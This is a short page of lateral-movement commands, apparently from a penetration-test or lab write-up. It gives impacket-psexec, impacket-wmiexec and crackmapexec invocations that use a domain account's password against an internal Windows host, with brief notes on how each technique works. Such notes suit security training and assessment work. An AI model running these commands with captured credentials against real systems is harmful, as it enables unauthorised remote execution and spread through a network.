# 💻 Phase 4 Commands — Lateral Movement Attempt

## SMB Remote Execution Attempt (PsExec)

```bash
impacket-psexec solaris.local/p.olson:'Solaris2026!'@192.168.10.100
```

### Purpose

Attempts remote command execution over SMB using Impacket PsExec functionality.

This technique relies on administrative access to SMB administrative shares including ADMIN$ and C$.

---

## WMI Remote Execution Attempt

```bash
impacket-wmiexec solaris.local/p.olson:'Solaris2026!'@192.168.10.100
```

### Purpose

Attempts remote command execution using Windows Management Instrumentation (WMI).

This technique relies on sufficient privileges for remote RPC and WMI access.

---

## Verify SMB Connectivity

```bash
crackmapexec smb 192.168.10.100 -u p.olson -p 'Solaris2026!'
```

### Purpose

Validates successful SMB authentication prior to remote execution attempts.
